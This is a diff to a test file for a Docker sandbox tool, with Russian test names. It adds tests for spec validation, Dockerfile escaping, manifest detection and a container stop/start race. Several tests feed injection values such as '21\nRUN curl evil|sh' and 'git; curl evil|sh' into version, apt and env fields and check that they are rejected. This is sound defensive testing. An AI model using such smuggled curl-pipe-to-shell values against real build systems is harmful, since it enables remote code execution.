@@ -8,7 +8,7 @@
  */
 
 import { deepStrictEqual, strictEqual, throws } from 'node:assert/strict';
-import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
+import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterEach, describe, it } from 'node:test';
@@ -17,8 +17,10 @@ import { buildDockerfile, imageTag, specHash } from '../src/sandbox/dockerfile.t
 import { hostMountSource } from '../src/sandbox/dockerSandbox.ts';
 import {
   findSandboxForCwd,
+  ensureSandboxFor,
   _resetSandboxRegistryForTests,
   _setSandboxForTests,
+  _setStoppingForTests,
 } from '../src/sandbox/registry.ts';
 import { parseSandboxSpec, SandboxSpecError, loadSandboxSpec } from '../src/sandbox/spec.ts';
 import { preflightBlockers } from '../src/sandbox/preflight.ts';
@@ -68,6 +70,88 @@ describe('разбор .sdlc/sandbox.json', () => {
       () => parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: { node: {} } }), 'x'),
       SandboxSpecError,
     );
+  });
+
+  it('версия с переводом строки — отказ, а не молчаливая подстановка в Dockerfile', () => {
+    throws(
+      () =>
+        parseSandboxSpec(
+          JSON.stringify({ base: 'x', toolchains: { jdk: { version: '21\nRUN curl evil|sh' } } }),
+          'x',
+        ),
+      SandboxSpecError,
+    );
+  });
+
+  it('версия не начинается с цифры — отказ', () => {
+    throws(
+      () => parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: { jdk: { version: 'latest' } } }), 'x'),
+      SandboxSpecError,
+    );
+  });
+
+  it('dist вне белого списка — отказ (раньше принимался и молча игнорировался)', () => {
+    throws(
+      () =>
+        parseSandboxSpec(
+          JSON.stringify({ base: 'x', toolchains: { jdk: { version: '21', dist: 'corretto' } } }),
+          'x',
+        ),
+      (e: unknown) => e instanceof SandboxSpecError && /corretto/.test((e as Error).message),
+    );
+  });
+
+  it('apt с shell-метасимволами — отказ', () => {
+    throws(
+      () =>
+        parseSandboxSpec(
+          JSON.stringify({ base: 'x', toolchains: {}, apt: ['git; curl evil|sh'] }),
+          'x',
+        ),
+      SandboxSpecError,
+    );
+  });
+
+  it('apt с обычным именем пакета — проходит', () => {
+    const spec = parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: {}, apt: ['make', 'g++'] }), 'x');
+    deepStrictEqual(spec.apt, ['make', 'g++']);
+  });
+
+  it('env не объект — отказ', () => {
+    throws(
+      () => parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: {}, env: 'oops' }), 'x'),
+      SandboxSpecError,
+    );
+  });
+
+  it('env массивом — отказ (раньше проходило: поля вовсе не было в валидации)', () => {
+    throws(
+      () => parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: {}, env: ['a', 'b'] }), 'x'),
+      SandboxSpecError,
+    );
+  });
+
+  it('env-ключ не похож на имя переменной — отказ', () => {
+    throws(
+      () => parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: {}, env: { 'not a var': 'x' } }), 'x'),
+      SandboxSpecError,
+    );
+  });
+
+  it('env-значение с переводом строки — отказ (инъекция Dockerfile-инструкций)', () => {
+    throws(
+      () =>
+        parseSandboxSpec(
+          JSON.stringify({ base: 'x', toolchains: {}, env: { X: 'a"\nRUN curl evil|sh\nENV Y="' } }),
+          'x',
+        ),
+      SandboxSpecError,
+    );
+  });
+
+  it('обычный env — проходит и доходит до спеки как есть', () => {
+    const spec = parseSandboxSpec(JSON.stringify({ base: 'x', toolchains: {}, env: { MAVEN_OPTS: '-Xmx1g' } }), 'x');
+    deepStrictEqual(spec.env, { MAVEN_OPTS: '-Xmx1g' });
   });
 
   it('нет файла — loadSandboxSpec отдаёт null, а не бросает', () => {
@@ -120,6 +204,19 @@ describe('генератор Dockerfile', () => {
   it('без docker: socket — CLI-слой не добавляется', () => {
     const spec: SandboxSpec = { base: 'debian:12-slim', toolchains: { node: { version: '22' } } };
     strictEqual(buildDockerfile(spec).includes('docker:cli'), false);
+  });
+
+  it('env-значение с кавычкой экранируется, а не закрывает ENV раньше времени', () => {
+    const spec: SandboxSpec = { base: 'debian:12-slim', toolchains: {}, env: { X: 'a"b\\c' } };
+    const df = buildDockerfile(spec);
+    strictEqual(df.includes('ENV X="a\\"b\\\\c"'), true, df);
+  });
+
+  it('два проекта, схлопывающихся в один safeName — разные теги образа (регресс на коллизию контейнера/тома)', () => {
+    // "Foo Bar" и "foo-bar" оба дают safeName "foo-bar" — раньше это был один и тот же тег.
+    const tagA = imageTag('Foo Bar', CV_LIKE_SPEC);
+    const tagB = imageTag('foo-bar', CV_LIKE_SPEC);
+    strictEqual(tagA === tagB, false, `${tagA} === ${tagB}`);
   });
 });
 
@@ -197,6 +294,27 @@ describe('detectSandboxSpec: черновик спеки по составу р�
         const { spec } = detectSandboxSpec(root);
         strictEqual(spec.toolchains.jdk, undefined);
         strictEqual(spec.toolchains.node, undefined);
+      },
+    );
+  });
+
+  it('нечитаемый манифест не роняет весь детект — best-effort, не всё-или-ничего', () => {
+    withFixture(
+      {
+        'backend/pom.xml': '<project><properties><java.version>21</java.version></properties></project>',
+        'frontend/package.json': JSON.stringify({ engines: { node: '>=22' } }),
+      },
+      (root) => {
+        const unreadable = join(root, 'backend/pom.xml');
+        chmodSync(unreadable, 0o000);
+        try {
+          const { spec } = detectSandboxSpec(root);
+          // pom.xml нечитаем — JDK не находится, но это не топит остальной детект.
+          strictEqual(spec.toolchains.jdk, undefined);
+          strictEqual(spec.toolchains.node?.version, '22');
+        } finally {
+          chmodSync(unreadable, 0o644);
+        }
       },
     );
   });
@@ -279,5 +397,46 @@ describe('реестр песочниц: адресация по cwd', () => {
     _setSandboxForTests('/proj/backend', fakeHandle('inner'));
     strictEqual(findSandboxForCwd('/proj/backend/src')?.specHash, 'inner');
     strictEqual(findSandboxForCwd('/proj/frontend')?.specHash, 'outer');
+  });
+
+  it('ensureSandboxFor ждёт незавершённую остановку контейнера того же проекта, не гонится мимо неё', async () => {
+    // Регресс на гонку: DELETE /api/runs/:id гасит песочницу fire-and-forget, а
+    // `active.delete()` внутри `stopSandboxForProject` синхронный — без ожидания `stopping`
+    // повторный старт того же проекта мог поднять новый контейнер, пока старый ещё в
+    // процессе `docker rm -f` того же детерминированного имени (экспериментально
+    // воспроизведено на реальном Docker: `docker run --name X` параллельно с `docker rm -f
+    // X` падает конфликтом имени в большинстве попыток).
+    const dir = mkdtempSync(join(tmpdir(), 'sdlc-stopping-race-'));
+    try {
+      let stoppingResolved = false;
+      let resolveStop: () => void = () => {};
+      const stoppingPromise = new Promise<void>((resolve) => {
+        resolveStop = () => {
+          stoppingResolved = true;
+          resolve();
+        };
+      });
+      _setStoppingForTests(dir, stoppingPromise);
+
+      const ensurePromise = ensureSandboxFor(dir, 'race-project');
+      let ensureResolved = false;
+      void ensurePromise.then(() => {
+        ensureResolved = true;
+      });
+
+      // Дать микрозадачам отработать — `ensureSandboxFor` не должен продвинуться дальше
+      // ожидания `stopping`, пока та не резолвится.
+      await new Promise((r) => setTimeout(r, 20));
+      strictEqual(ensureResolved, false, 'ensureSandboxFor не подождал незавершённую остановку');
+
+      resolveStop();
+      const result = await ensurePromise;
+      strictEqual(stoppingResolved, true);
+      // В `dir` нет .sdlc/sandbox.json — после ожидания честно возвращает null, не
+      // переиспользует ничего чужого.
+      strictEqual(result, null);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
   });
 });
